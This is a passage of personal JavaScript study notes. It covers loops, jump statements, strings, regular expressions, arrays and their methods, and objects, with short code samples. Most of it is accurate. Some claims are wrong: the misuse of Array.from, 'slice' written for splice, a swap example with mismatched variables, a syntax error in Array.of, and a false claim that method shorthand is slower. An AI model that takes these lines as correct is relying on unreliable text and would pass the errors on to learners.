  isAdmin: true
};

for (let key in user) {
  // keys
  alert(key); // name, age, isAdmin
  // values for the keys
  alert(user[key]); // John, 30, true
}
```

- it can be used with arrays to loop through the indexes

  ```js
  let arr = ['Apple', 'Orange', 'Pear'];

  for (let key in arr) {
    alert(arr[key]); // Apple, Orange, Pear
  }
  ```

  - The `for..in` loop is optimized for generic objects, not arrays, and thus is 10-100 times slower. Of course, it’s still very fast. The speedup may only matter in bottlenecks. But still we should be aware of the difference.

  - ⚠️ A very common bug is accidentally using `for..in` with arrays when you meant to use `for..of`. Because arrays are technically just objects where the indexes are property names, `for..in` will loop over the indexes (`0`, `1`, `2`) rather than the actual values inside the array, and it might even catch inherited properties you didn't expect. **Always use `for..of` with arrays!**

- Sometimes you don't want to include the inherited properties of the object when iterating over it, in that case you can either:
  - use `Object.keys()`, `Object.values()`, `Object.entries()` methods instead with `for..of` loop.
  - have extra checks using `hasOwnProperty` method.

    ```js
    let user = {
      name: 'John',
      age: 30,
      isAdmin: true
    };

    for (let key in user) {
      if (user.hasOwnProperty(key)) {
        alert(key);
        alert(user[key]);
      }
    }
    ```

---

### For await..of loop (Async Iteration)

Introduced in ES2018. It allows you to iterate over async iterables, such as streams, file streams, and network streams.

It's a new way to iterate over async iterables. It's used to iterate over async iterables like `fetch`, `readableStream`, etc.

```js
const asyncIterable = {
  [Symbol.asyncIterator]() {
    return {
      i: 0,
      next() {
        if (this.i < 3) {
          return Promise.resolve({ value: this.i++, done: false });
        }

        return Promise.resolve({ done: true });
      }
    };
  }
};

for await (let value of asyncIterable) {
  // code
}
```

---

## Jump Statements

Jump statements are statements that are used to control the flow of execution of a program. There are three types of jump statements: `break`, `continue`, and `return`.

These commands force the JavaScript interpreter to immediately jump to a new location in the source code

- `break`: Exits the current loop or switch statement.
- `continue`: Skips the current iteration of a loop and proceeds to the next iteration.
- `return`: Exits the current function and returns a value to the caller.
- `yield`: Pauses the execution of a generator function and returns a value to the caller.
- `throw`: Throws an error. It is used to handle errors and exceptions.

```js
// break example: the loop will terminate immediately when i becomes 5

for (let i = 0; i < 10; i++) {
  if (i === 5) {
    break;
  }
  console.log(i);
}

// continue example: the loop will skip the current iteration when i becomes 5

for (let i = 0; i < 10; i++) {
  if (i === 5) {
    continue;
  }
  console.log(i);
}

// return example: it will exit the function when i becomes 5

function example() {
  for (let i = 0; i < 10; i++) {
    if (i === 5) {
      return;
    }
    console.log(i);
  }
}

example();

// yield example: it will pause the execution of the generator function when i becomes 5 and return the value to the caller.

function* example() {
  for (let i = 0; i < 10; i++) {
    if (i === 5) {
      yield i;
    }
  }
}

// throw example: it will throw an error when i becomes 5

function example() {
  for (let i = 0; i < 10; i++) {
    if (i === 5) {
      throw new Error('i is 5');
    }
    console.log(i);
  }
}

example();
```

---

## Data Structures

They are a way of organizing and storing data so that we can access and modify it efficiently.

![data-structures](./img/data-structures.png)

### Strings

A string is an immutable (unchangeable) sequence of 16-bit values, where each value usually represents a Unicode character.

- However, some characters—like **emojis** or rare characters—don't fit into a single 16-bit value. JavaScript handles these using a "surrogate pair" of two 16-bit values. This creates an interesting quirk when checking string length:

  ```js
  alert('Hello'.length); // 5
  alert('H'.length); // 1
  alert('😂'.length); // 2
  ```

  - 💡 Luckily, modern JavaScript (ES6) made strings "iterable." If you use a `for/of` loop on a string, it will intelligently iterate over the actual characters (so it will treat the emoji as one character), rather than blindly looping over the raw 16-bit values

- **Multiline strings**:

  ```js
  // Using backticks
  let guestList = `
    Guests:
    * John
    * Pete
    * Mary
  `;

  // Using special characters
  let guestList = 'Guests:\n * John\n * Pete\n * Mary';

  // "\n" is a newline character, and it counts as one character.
  console.log('a\n b'.length); // 4 (a, newline, space, b)
  ```

- quotes inside strings:
  - In order to use quotes inside a string, you can use the **opposite** quotes or use the **backslash** `\` to escape the quotes.

    ```js
    let str = "I'm the Walrus!";
    let str2 = "I'm the Walrus!";

    let str3 = 'Steve Jobs once said: "something"';
    let str4 = 'Steve Jobs once said: "something"';
    ```

  - or use **backticks** `"``"` to avoid using quotes inside the string.

    ```js
    let str = `I'm the Walrus!`;
    let str2 = `Steve Jobs once said: "something"`;
    ```

- **Escape Sequences in Strings** - It's a way to include special characters in strings that would otherwise be difficult to represent. They are denoted by a backslash `\` followed by a character or a sequence of characters. Some common escape sequences include:
  - `\n` - Newline
  - `\t` - Tab
  - `\\` - Backslash
  - `\'` - Single quote
  - `\"` - Double quote

  ```js
  let str = 'Hello\nWorld'; // This will create a string with a newline between "Hello" and "World"
  let str2 = 'This is a tab:\tHere'; // This will create a string with a tab between "This is a tab:" and "Here"
  let str3 = 'This is a backslash: \\'; // This will create a string with a backslash at the end
  let str4 = 'She said: "Hello"'; // This will create a string with double quotes around "Hello"
  let str5 = "It's a nice day"; // This will create a string with a single quote in "It's"
  ```

- **Template Literals (String Interpolation)**:
  - Template literals are a way to create strings that can contain embedded expressions. They are denoted by backticks `` ` `` and can include placeholders for variables or expressions using `${...}`. (everything inside `${...}` is evaluated as a JavaScript expression and its result is included in the string)

    ```js
    let name = 'John';
    let greeting = `Hello, ${name}!`; // This will create a string "Hello, John!"
    ```

- **Working with strings**:
  - We can concatenate (join) strings using the `+` operator or template literals, or using methods like `concat()`.

    ```js
    let str1 = 'Hello';
    let str2 = 'World';

    // Using + operator
    let result = str1 + ' ' + str2; // "Hello World"

    // Using template literals
    let result2 = `${str1} ${str2}`; // "Hello World"

    // Using concat method
    let result3 = str1.concat(' ', str2); // "Hello World"
    ```

---

#### String Methods

- Strings have methods like `length`, `toUpperCase()`, and `indexOf` despite being primitive types.
  - 💡 This is due to **"Boxing"**: JavaScript temporarily converts the string to a `String` object to access its methods and properties using the `prototype` chain.
    ![string-methods](./img/string-methods.avif)

- **convert number to a string**

  ```js
  const str = number + '';
  // or
  const str = String(number);
  ```

- **Access characters using index**
  - Use `[]` or `charAt(pos)`:

    ```js
    let str = 'Hello';
    alert(str[0]); // H
    alert(str.charAt(0)); // H
    ```

  - Difference: if no character is found, indexing `[]` returns `undefined`, and `charAt()` returns an empty string:

    ```js
    let str = `Hello`;

    alert(str[1000]); // undefined
    alert(str.charAt(1000)); // '' (an empty string)
    ```

- **Slicing and Substrings**
  - `substring(start, end)`: Similar to `slice()`, but allows `start` to be greater than `end`.

    ```js
    let str = 'stringify';

    // these are same for substring
    alert(str.substring(2, 6)); // "ring"
    alert(str.substring(6, 2)); // "ring"

    // ...but not for slice:
    alert(str.slice(2, 6)); // "ring" (the same)
    alert(str.slice(6, 2)); // "" (an empty string)
    ```

  - Usually `slice` is used with `indexOf` to get a substring from a string

    ```js
    let str = 'stringify';
    alert(str.slice(0, str.indexOf('i'))); // str
    ```

- **Split & Join**
  - `split(separator, limit)`: Splits a string into an array of substrings using a separator.
    - `separator` is a string or a regular expression.
    - `limit` is the number of splits to make.
    - If `separator` is an empty string, the string is split into an array of characters.

      ```js
      let names = 'John, Pete, Mary';
      let arr = names.split(', '); // ["John", "Pete", "Mary"]
      ```

  - `join(separator)`: Creates a string from an array by joining all elements with a separator.
    - If `separator` is omitted, the array elements are separated with a comma.

      ```js
      let arr = ['John', 'Pete', 'Mary'];
      let str = arr.join(', '); // John, Pete, Mary
      ```

    - Without a separator, it's similar to `toString()` method:

      ```js
      let arr = [1, 2, 3];
      let str = arr.join(); // "1,2,3"
      let str2 = arr.toString(); // "1,2,3"
      ```

- **Replacing words in a string**

  ```js
  const str = 'I really love cats. My cat is the best cat in the world.';

  // replace all occurrences of 'cat' with 'dog'
  const newStr = str.replace(/cat/g, 'dog'); // using regular expression
  // or
  const newStr = str.replaceAll('cat', 'dog'); // using replaceAll method
  ```

  - 💡 Important Reminder: Strings in JavaScript are immutable. Methods like `replace()  and`toUpperCase()` do not alter the original string; instead, they compute and return a brand-new string

- **Capitalizing the first letter**

  ```js
  let str = 'stringify';
  alert(str[0].toUpperCase() + str.slice(1)); // "Stringify"
  // or
  alert(str.replace(str[0], str[0].toUpperCase())); // "Stringify"
  ```

- **Padding a string**
  ![padding](./img/padding-1.avif)
  - `padStart(targetLength, padString)`: Pads the current string with another string (repeated, if needed) so that the resulting string reaches the given length.

    ```js
    let str = '5';
    alert(str.padStart(4, '0')); // "0005"

    let cardNumber = '2034399002125581';
    let last4Digits = cardNumber.slice(-4);
    let maskedNumber = last4Digits.padStart(cardNumber.length, '*'); // "************5581"
    ```

  - `padEnd(targetLength, padString)`: Pads the current string with another string (repeated, if needed) so that the resulting string reaches the given length.

    ```js
    let str = '5';
    alert(str.padEnd(4, '0')); // "5000"
    ```

    ![padding](./img/padding-2.png)

- **Chaining methods**
  - String methods can be chained because they return a string.

    ```js
    let str = ' stRinGify';
    alert(str.toLowerCase().trim()); // "stringify"
    ```

---

#### Operations on strings

- The binary `+` is the only operator that supports strings in such a way (concatenation) `2 + '1' --> "21"`

  ```js
  // NOTE That:
  console.log('1' + 2 + 2); // "122" and not "14"
  ```

- Other arithmetic operators work only with numbers and always convert their operands to numbers.

  ```js
  console.log('3' - '2'); // 1
  console.log('3' / '2'); // 1.5
  ```

---

#### Regular expressions (Pattern Matching)

Regular expressions search for characters that form a pattern. They can also replace those characters with new ones.

- Regular expressions do not just search for matching letters; they can check for sequences of upper/lowercase characters, numbers, punctuation, and other symbols.
  ![regular expressions](./img/regular-expressions.png)

- We use `match()` method to match a string with a regular expression.

  ```js
  let str = 'We will, we will rock you';
  let result = str.match(/we/gi); // ["We", "we", "we"]
  ```

- Once you define a pattern, you can use it to search, test, or replace text within strings

  ```js
  let text = 'testing: 1, 2, 3'; // Sample text.
  let pattern = /\d+/g; // A pattern that matches one or more digits.

  pattern.test(text); // => true: a match exists.
  text.search(pattern); // => 9: position of first match.
  text.match(pattern); // => ["1", "2", "3"]: array of all matches.
  text.replace(pattern, '#'); // => "testing: #, #, #".
  ```

---

### Arrays

**Array** is an ordered collection of values, where each value is called an **element**, and each element has a numeric position known as an **index**

- It's a special kind of object, with numbered indexes. when you use index to access array elements, it behaves like an object.
  - Also it's special because JS store `length` of array as a property of array

    ```js
    let fruits = ['apple', 'banana', 'orange'];

    fruits[0]; // JS reads it as fruits['0'], which is a property of the fruits object -> 'apple'
    fruits['length']; // '3' -> length is a property of array
    ```

- To create an array in JS:
  - Using literal notation (recommended):

    ```js
    let fruits = ['apple', 'banana', 'orange'];
    ```

  - Using `Array` constructor:

    ```js
    let fruits = new Array('apple', 'banana', 'orange');
    ```

  - Using `Array.of()` constructor:

    ```js
    let fruits = Array.of('apple', 'banana', 'orange');
    ```

  - Using `Array.from()` constructor:

    ```js
    let fruits = Array.from('apple', 'banana', 'orange');

    // It can take a second argument as a map function
    let numbers = Array.from([1, 2, 3], x => x * x); // [1, 4, 9]
    ```

- There's a quirk with `new Array(number)`, where it creates an array of that size with empty slots, and `Array.of()` was introduced in ES6 to overcome this issue as it creates an array of the given size with the given values

  ```js
  let arr = new Array(5);
  console.log(arr); // [empty × 5] and length 5

  let arr2 = Array.of(5);
  console.log(arr2); // [5] and length 1
  ```

- **To check if a value is an array, use `Array.isArray(value)`**.

- **"Sparse Array"**: It's an array with empty slots, meaning it has gaps in its indices (the length of the array is not equal to the number of actual values in the array)

  ```js
  const sparseArray = [1, , 3];
  console.log(sparseArray.length); // 3
  console.log(sparseArray[1]); // undefined

  // creating a sparse array
  const sparseArray = new Array(5);
  const sparseArray2 = Array.of(1, , 3);
  ```

- **The `length` property**: Every array has a `length` property that automatically updates as elements are added.
  - **Truncating arrays**: It works in reverse too! If you manually set the `length` property to a number _smaller_ than its current value, JavaScript instantly truncates the array, permanently deleting any elements whose index is greater than or equal to the new length.

    ```js
    let fruits = ['apple', 'banana', 'orange'];
    fruits.length = 2; // Truncate
    console.log(fruits); // ['apple', 'banana'] (orange is permanently deleted)
    ```

#### Array Destructuring

Introduced in ES6, destructuring assignment is a compound syntax that lets you extract ("destructure") values from arrays or objects and assign them to individual variables in a single line of code.

It's a way to extract multiple values from an array or object and assign them to variables in a single statement.

```js
let arr = ['Ilya', 'Kantor'];

// destructuring assignment
const [firstName, surname] = arr;

// instead of
// let firstName = arr[0];
// let surname = arr[1];
```

- **This is incredibly useful when a function returns an array of values**

  ```js
  function getCoords() {
    return [10, 20];
  }

  // Destructuring makes this easy and readable
  const [x, y] = getCoords();
  console.log(x); // 10
  console.log(y); // 20
  ```

- default values in **destructuring** -> (it's usually when we don't know the array is complete or not, like from API)

  ```js
  const [p = 1, q = 1, r = 1] = [8, 9];
  // now -> r will have a value
  ```

- skipping items when **destructuring**:

  ```js
  // skipping the second array-item
  const [one, , three] = [1, 2, 3];
  ```

- Using `...` to **collect remaining elements**: (usually used with API)

  ```js
  let menu = ['Pizza', 'Burger', 'Fries', 'Salad', 'Drink'];

  // The first is the main course, the rest are sides
  const [mainCourse, ...sides] = menu;

  console.log(mainCourse); // "Pizza"
  console.log(sides); // ["Burger", "Fries", "Salad", "Drink"]

  const [first, second, ...rest] = items;

  // `rest` is now a new array containing the 3rd item onwards
  console.log(rest); // ["C", "D", "E"]

  // ---------------------------------------------------------------------------------------------------
  // ⚠️ note that it's different from this
  const [mainCourse, sides] = menu;
  // now -> sides will have only "Burger"
  ```

- Use cases:
  - switching values of 2 variables :

    ```js
    let a = 5;
    let b = 8;
    [x, y] = [y, x]; // note that we don't use const / let here
    ```

---

#### Array methods

![array-methods](./img/array-methods00.PNG)

- When we call these methods on a "Array", JavaScript will use the properties and methods in the `Array` object to perform the operation and then return the result (using `prototype` chain).
  ![array-methods](./img/array-methods-1.png)

- **Adding / Removing elements from beginning and end**

  ```js
  let arr = ['I', 'study', 'JavaScript'];

  // Add elements to the end of the array
  arr.push('hello', 'world'); // ['I', 'study', 'JavaScript', 'hello', 'world']

  // remove 2 first elements from the front
  arr.shift(); // ['study', 'JavaScript', 'hello', 'world']
  arr.shift(); // ['JavaScript', 'hello', 'world']

  // add the new element at the beginning
  arr.unshift("Let's", 'dance'); // ["Let's", "dance", "JavaScript", "hello", "world"]
  ```

  - `push()` and `unshift()` methods are used to add elements to the end and beginning of an array.
    - These methods return the new length of the array.
  - `pop()` and `shift()` methods are used to remove elements from the end and beginning of an array.
    - These methods return the removed element.
  - `splice` can add and remove elements from the array at the same time, by taking `start`, `deleteCount`, and `items` as parameters.

- **(`delete` vs `splice`)**
  - always use `slice` to remove element from an array, because `delete` will leave an empty slot in the array.

  ```js
  const arr1 = ['I', 'go', 'home'];
  const arr2 = ['I', 'go', 'home'];

  // delete
  delete arr1[1]; // remove "go"
  console.log(arr1[1]); // undefined
  // now arr1 = ["I",  , "home"];
  console.log(arr1.length); // 3

  //splice
  arr2.splice(1, 1); // from index 1 remove 1 element
  console.log(arr2); // ["I", "home"]
  console.log(arr2.length); // 2
  ```

- **`indexOf` vs `findIndex`**:
  - `indexOf(value)`: Finds index of a primitive value, returns `-1` if not found.
  - `findIndex(callback)`: Finds index using a callback function, useful for objects or complex conditions.

- methods for creating arrays with filled values
  - `Array.fill(value, start, end)` -> it fills an array with a static value by replacing the empty slots or already filled slots in the array

    ```js
    const x = new Array(7); // [empty × 7]
    x.fill(7); // [7, 7, 7, 7, 7, 7, 7]
    x.fill(1, 3, 5); // [empty × 3, 1, 1, empty × 2]
    ```

  - `Array.from()`: creates an array from an iterable object and an optional mapping function.

    ```js
    const y = Array.from({ length: 3 }, () => 1); // [1,1,1]
    const z = Array.from({ length: 3 }, (_, i) => i + 1); // [1, 2, 3]

    const chars = Array.from('hello'); // ['h', 'e', 'l', 'l', 'o']

    // copy an array
    const arr = [1, 2, 3];
    const arrCopy = Array.from(arr); // [1, 2, 3] (a new copy)

    // convert set to array
    const set = new Set(['foo', 'bar']);
    const arr = Array.from(set); // ['foo', 'bar']
    ```

    - mainly used to convert `node list` to an array

      ```js
      const movementsUI = Array.from(document.querySelectorAll('.movements__value'));
      // or you can use spread operator [...document.querySelectorAll(".movements__value")]
      ```

    - Note that it takes a **mapping function** as a second argument.

      ```js
      const movementsUI = Array.from('abcd', x => x.toUpperCase()); // ['A', 'B', 'C', 'D']
      ```

- Notes:
  - operations on array:

    ```js
    alert([] + 1); // "1"
    alert([1] + 1); // "11"
    alert([1, 2] + 1); // "1,21"
    ```

  - Methods cheat sheets
    ![array](./img/array.jpg)
    ![methods](./img/array%20methods.jpg)

---

##### Subarrays (`slice` and `splice`)

![slice-splice](./img/slice-splice.jpg)

- `slice()` (returns a new subarray or a slice of the original array)
  - the slicing happens from `start` to `end` **(not including `end`)**, so `end` is not included in the result.
  - `-1` in `slice` means the last element, but in `splice` it means the last element will be removed.

  ```js
  let arr = ['t', 'e', 's', 't'];

  arr.slice(1, 3); // e,s (copy from 1 to 3)
  arr.slice(-2); // s,t (copy from -2 to the end)
  arr.slice(1, -1); // e,s (copy from 1 to -1) not including -1
  arr.slice(); // t,e,s,t (copy the whole array)
  ```

- `splice()` (modifies the original array **by inserting/removing elements**)
  - it takes `start`, `deleteCount`, and `items` (optional) as parameters.

  ```js
  let arr = ['I', 'study', 'JavaScript'];

  // from index 1 remove 1 element
  arr.splice(1, 1); // ["study"]

  // from index 0 remove 3 elements and replace them with another
  arr.splice(0, 3, "Let's", 'dance'); // ["I", "study", "JavaScript"] -> ["Let's", "dance"]
  ```

---

##### Flatten and Concatenate Array

- `flat(depth)`: Flattens nested arrays up to the specified depth **recursively**.
  ![flat](./img/flat.png)
  - By default it only flattens one level deep.
  - `Infinity` can be passed as an argument to flatten all levels.

    ```js
    const arr = [1, [2, [3, [4]]]];
    console.log(arr.flat()); // [1, 2, [3, [4]]]
    console.log(arr.flat(2)); // [1, 2, 3, [4]]
    console.log(arr.flat(Infinity)); // [1, 2, 3, 4]
    ```

- `flatMap(callback)`: Maps and flattens the array **one level deep** with customization of the mapping.
  ![flatmap](./img/flatmap.png)
  - It works like a `map()` method, then flattens the result by one level.

- `concat()`: Joins two or more arrays.

  ```js
  const arr1 = [1, 2, 3];
  const arr2 = [4, 5, 6];
  const arr3 = [7, 8, 9];
  const result = arr1.concat(arr2, arr3);
  ```

---

##### Array Data Transformation Methods (`map`, `filter`, `reduce`)

![methods](./img/array-methods-2.png)

- `map`
  - It's a method used to **transform** an array by **applying a function** to each element of the array.
    - it creates a new array with the results of calling a provided function on every element in the calling array.

      ```js
      const arr = [1, 2, 3, 4];
      const double = arr.map(num => num * 2); // [2, 4, 6, 8]
      ```

- `filter`
  - It's a method used to **filter** an array by **applying a predicate function (func that returns boolean values)** to each element of the array.
    - it creates a new array with all elements that pass the test implemented by the provided function.

      ```js
      const arr = [1, 2, 3, 4];
      const even = arr.filter(num => num % 2 === 0); // [2, 4]
      ```

  - `filter` vs `find` vs `findIndex`
    ![filtervsfind](./img/filtervsfind.webp)
    - `filter`: Returns an array of all items matching a condition.
    - `find`: Returns the **first** item matching a condition or `undefined`.
    - `findIndex`: Returns the index of the **first** item matching a condition or `-1`.

- `reduce`
  - It's a method used to **reduce** an array to a single value by **executing a "reducer function"** for each element of the array.

    ![reduce](./img/reduce-method-1.png)

  - It takes two arguments: a function that performs the reduction, and an **optional initial value** (if not provided, the first element of the array will be used as the initial value).

  - Examples:
    - Sum of all elements in an array

      ```js
      const arr = [1, 2, 3, 4];
      const sum = arr.reduce((acc, cur) => acc + cur, 0); // 10
      // 0 is the initial value of the accumulator
      ```

      ![reduce](./img/reduce-method-2.png)

    - Get the maximum value in an array

      ```js
      const arr = [20, 45, -40, 30, -65];
      const max = arr.reduce((acc, cur) => (acc > cur ? acc : cur), arr[0]);
      // use arr[0] as the initial value of the accumulator and not 0 to handle negative numbers
      ```

  - It has 4 parameters: `accumulator`, `currentValue`, `currentIndex`, `array`

    ```js
    const arr = [1, 2, 3, 4];
    const sum = arr.reduce((acc, cur, i, arr) => acc + cur, 0); // 10
    ```

  - `reduceRight`: Same as `reduce`, but it iterates through the array from **right to left**.

---

##### Array Predicates (`every`, `some`)

Like `filter()`, these methods iterate through your array and apply a **predicate function** (a function that **returns true or false**) to each element:

- `some` & `every` methods
  - `some` : returns `true` if **at least one** element in the array **satisfies** the condition defined by the predicate.
  - `every` : returns `true` if **all** elements in the array **satisfy** the condition defined by the predicate.

    ```js
    const movements = [200, 450, -400, 3000, -650, -130, 70, 1300];

    // some
    const anyDeposits = movements.some(mov => mov > 0); // true

    // every
    const allDeposits = movements.every(mov => mov > 0); // false
    ```

- `find` & `findIndex` methods
  - `find`: Returns the **first** element in the array that **satisfies** the condition defined by the predicate.
    - If no match is found, `find()` returns `undefined`.
  - `findIndex`: Returns the **index** of the **first** element in the array that **satisfies** the condition defined by the predicate.
    - If no match is found, `findIndex()` returns `-1`.

    ```js
    const movements = [200, 450, -400, 3000, -650, -130, 70, 1300];

    // find
    const firstWithdrawal = movements.find(mov => mov < 0); // -400

    // findIndex
    const firstWithdrawalIndex = movements.findIndex(mov => mov < 0); // 2
    ```

---

##### Array Sorting

- The `.sort()` method works as follows:
  - without condition -> it will sort based on the default comparator which assumes **string operations** (all values are coerced and compared as string)

    ```js
    [1, 30, 4, 21].sort(); // results: [1, 21, 30, 4]
    // because 1 < 21 < 30 < 4 (as strings)
    ```

  - with condition -> it will sort based on the provided comparator function
    - **Comparator function** should return a negative value if `a` should come before `b`, a positive value if `b` should come before `a`, and `0` if they are equal.

      ```js
      // compare function
      const compare_1 = (a, b) => {
        if (a > b) return 1;
        if (a == b) return 0;
        if (a < b) return -1;
      };
      // or
      const compare_2 = (a, b) => a - b;

      // if return is (< 0), show A before B
      // if return is (> 0), show B before A
      // if return is (0), items should remain in the same order
      ```

    - Example:
      - sorting numbers:

        ```js
        [1, 30, 4, 21].sort((a, b) => a - b); // results: [1, 4, 21, 30]
        // 1 - 30 = -29 (negative) -> `a` should come before `b` -> [1, 30]
        // 30 - 4 = 26 (positive) -> `b` should come before `a` -> [1, 4, 30]
        // 30 - 21 = 9 (positive) -> `b` should come before `a` -> [1, 4, 21, 30]
        ```

      - sorting dates:

        ```js
        const holidays = ['2014-12-25', '2014-01-01'];
        holidays.sort(function (a, b) {
          const dateA = new Date(a);
          const dateB = new Date(b);
          return dateA - dateB;
        });
        ```

      - sorting string characters:

        ```js
        const data = ['t', 'A', 'a', 'B', 'b'];
        data.sort((a, b) => {
          return a.localeCompare(b);
        }); // ["a", "A", "b", "B", "t"]
        ```

- `reverse`
  - Reverses the order of the elements in an array.
  - Modifies the original array (in-place).
  - returns the reversed array.

    ```js
    const arr = [1, 2, 3];
    arr.reverse(); // [3, 2, 1]
    ```

- Note that `sort` method modifies the original array (in-place). If you want to keep the original array unchanged, you can use `slice` method to create a copy of the array and then sort the copy.

  ```js
  const arr = [1, 30, 4, 21];
  const sorted = arr.slice().sort((a, b) => a - b);
  // or
  const sorted = [...arr].sort((a, b) => a - b);
  ```

---

### Object

It's a data structure that can store a collection of **key-value pairs**.

- There're 3 ways to create an object:
  - **Object Literals**: `let obj = {};`
  - **Constructor Literals (`new` keyword)**: `let obj = new Object() || new Array() || new Set();`
  - **Object.create() method**: `let obj = Object.create({});` (creates an object from scratch, and the first argument is the prototype of the object)
  - **use a function as a template for creating objects**:

    ```js
    function Hotel(name, rooms) {
      this.name = name;
      this.rooms - rooms;
      // a method
    }

    // Don't forget the "new" keyword
    var hotel_1 = new Hotel('park', 120);
    ```

- To create a new object from an existing object: [How to deep copy an object](./12-JS-interviews-questions-tricks.md#how-to-deep-copy-an-object)

- All Object keys are "stringified" (converted to strings) except for Symbols.

  ```js
  obj[1] = 'hello';
  obj['1'] = 'world';
  console.log(obj[1]); // 'world' -> because the key is converted to a string and overwrites the previous value
  ```

  - Note that it won't be type-coerced to a boolean, so `obj[true]` is converted to `obj['true']`.

#### Properties Accessing & Modification & Deletion

- To check if property exists in object:
  - `hasOwn(obj, property)` -> ignores inherited properties, and it's the recommended way

    ```js
    const person = {
      name: 'John',
      age: 30
    };

    console.log(Object.hasOwn(person, 'name')); // true
    ```

  - `in` operator -> checks own and inherited properties

    ```js
    const person = {
      name: 'John',
      age: 30
    };

    console.log('name' in person); // true
    ```

  - `hasOwnProperty(property)` -> ignores inherited properties, but it's not recommended to use it as it's not a static method (i.e., it belongs to the object instance, not to the Object constructor)

    ```js
    const person = {
      name: 'John',
      age: 30
    };

    console.log(person.hasOwnProperty('name')); // true
    ```

  - `obj.x !== undefined` or `obj.x !== null` -> It's a common pattern used by developers but it's not recommended to use it as it's not a reliable way to check if a property exists in an object (i.e., it might return false positives).

- we can access object properties using "dot notation" and "bracket notation"
  ![objectRules](./img/objectRules.png)

  ```js
  const jonas = {
    firstName: 'Jonas',
    birthYear: 1991,

    calcAge: function () {
      this.age = 2037 - this.birthYear;
      return this.age;
    }
  };

  // dot notation
  console.log(jonas.firstName); // 'Jonas'

  // bracket notation
  console.log(jonas['firstName']); // 'Jonas'
  ```

- Note that we cannot use dot notation to access object properties with special characters or spaces in their names.

  ```js
  const jonas = {
    first-Name: 'Jonas', // this is invalid syntax
    birthYear: 1991,

    calcAge: function () {
      this.age = 2037 - this.birthYear;
      return this.age;
    }
  };

  console.log(jonas.first-Name); // undefined
  console.log(jonas['first-Name']); // 'Jonas'
  ```

- Also the only way to add new properties to object as a variable value is to use bracket notation

  ```js
  const jonas = {
    firstName: 'Jonas',
    birthYear: 1991,

    calcAge: function () {
      this.age = 2037 - this.birthYear;
      return this.age;
    }
  };

  const property = 'lastName';
  jonas[property] = 'Smith';
  // ⚠️Different from -> jonas.property = 'Smith'
  // Because the first one is using the value of the variable "property" as the key
  // And the second one is using the string "property" as the key

  console.log(jonas[property]); // 'Smith'
  console.log(jonas.property); // undefined -> because it's looking for a property named "property", not the value of the variable "property"
  ```

- If you attempt to query a property that does not exist, JavaScript will return `undefined` (not an error).

  ```js
  const jonas = {
    firstName: 'Jonas',
    birthYear: 1991
  };

  console.log(jonas.middleName); // undefined
  ```

- If you attempt to query a property on `null` or `undefined`, JavaScript will throw a `TypeError` (not `undefined`). To handle this, use either `optional chaining` or `check if the object is not null or undefined`.

  ```js
  let jonas = null;
  console.log(jonas.firstName); // TypeError: Cannot read properties of null (reading 'firstName')

  // Optional chaining
  console.log(jonas?.firstName); // undefined

  // Check if the object is not null or undefined
  console.log(jonas && jonas.firstName); // undefined
  ```

- To delete a property from an object:

  ```js
  delete jonas.age;
  ```

  - Gotcha: `delete` only delets `own` properties, not inherited properties.

    ```js
    delete person.job; // ✅ it will delete it as it's its own property

    delete person.toString; // ❌ it won't delete it as it's not its own property, it's inherited from Object.prototype
    ```

- To change a property from an object:

  ```js
  jonas.age = 25;
  ```

---

#### Object Methods

- Object methods are functions that are stored as object properties, and have access to the object's data through the `this` keyword.

  ```js
  const jonas = {
    firstName: 'Jonas',
    birthYear: 1991,

    calcAge: function () {
      this.age = 2037 - this.birthYear;
      return this.age;
    }
  };

  jonas.calcAge();
  ```

- we use `function expression` in objects to declare `methods` because it's better for performance as it's not re-created every time we create a new object

  ```js
  const jonas = {
    firstName: 'Jonas',
    birthYear: 1991,

    // using function expression (recommended ✅)
    calcAge: function () {
      this.age = 2037 - this.birthYear;
      return this.age;
    },

    // using function declaration (not recommended ❌)
    calcAge() {
      this.age = 2037 - this.birthYear;
      return this.age;
    }

    // using function declaration (won't work ❌)
    function calcAge() {
      this.age = 2037 - this.birthYear;
      return this.age;
    }
  };
  ```

---

#### Object.keys, values, entries

- `Object.keys(obj)` – returns an array of keys.
- `Object.values(obj)` – returns an array of values.
- `Object.entries(obj)` – returns an array of `[key, value]` pairs.

- Please note the distinctions (compared to map for example):

  |             | **Map**      | **Object**         |
  | ----------- | ------------ | ------------------ |
  | Call syntax | `Map.keys()` | `Object.keys(obj)` |
  | Returns     | iterable     | “real” Array       |

---

#### Transforming objects (operations on objects)

Objects lack many methods that exist for arrays, e.g. `map`, `filter` and others.

- So, if we’d like to apply them, then we can use `Object.entries` followed by `Object.fromEntries`:

  ```js
  let prices = {
    banana: 1,
    orange: 2,
    meat: 4
  };

  let doublePrices = Object.fromEntries(
    Object.entries(prices).map(entry => [entry[0], entry[1] * 2])
  );

  alert(doublePrices.meat); // 8
  ```

- Serialization:
  - "Serializing" means **converting data structures** — arrays, objects, Maps, Sets, etc. — into a format that can be:
    - stored (in `localStorage`, `IndexedDB`)
    - or transmitted (sending an object to a server in an HTTP request)
  - `JSON.stringify()`: Converts a value to a JSON string. (Serialization)
  - `JSON.parse()`: Converts a JSON string to a value. (Deserialization)

  ```js
  // 1. To Store in LocalStorage
  const userData = { name: 'John', age: 30 };
  localStorage.setItem('user', JSON.stringify(userData)); // Convert to string

  // 2. To Retrieve from LocalStorage (then use in your JS)
  const savedUser = JSON.parse(localStorage.getItem('user')); // Convert back to object
  console.log(savedUser.name); // "John"
  ```

---

#### ES6 Object Features

##### Shorthand properties & Methods

Before ES6, if we had variables with the same name as the object property name, we had to write the property name twice:

Before ES6:

```js
const name = 'Jonas';
const age = 30;

const jonas = {
  name: name,
  age: age
};
```

After ES6:

```js
const name = 'Jonas';
const age = 30;

const jonas = {
  name,
  age
};
```

- Also we can use method shorthand syntax in ES6:
  - Before ES6:

    ```js
    const jonas = {
      name: 'Jonas',
      age: 30,
      calcAge: function () {
        this.age = 2037 - this.birthYear;
        return this.age;
      }
    };
    ```

  - After ES6:

    ```js
    const jonas = {
      name: 'Jonas',
      age: 30,
      calcAge() {
        this.age = 2037 - this.birthYear;
        return this.age;
      }
    };
    ```

##### Computed property names

Sometimes you don't know the name of a property until the program is running (for example if the property name is stored in a variable), previously we had to create an empty object first and then use square brackets to add the property, but with ES6 we can use computed property names:

```js
// Old way
const key = 'role'; // could be from user input 'role' value
const user = {};
user[key] = 'Admin';
user[key + 'Id'] = 42;

// New way (ES6 Computed Property Names)
const key = 'role'; // could be from user input 'role' value
const user = {
  [key]: 'Admin',
  [key + 'Id']: 42
};
```

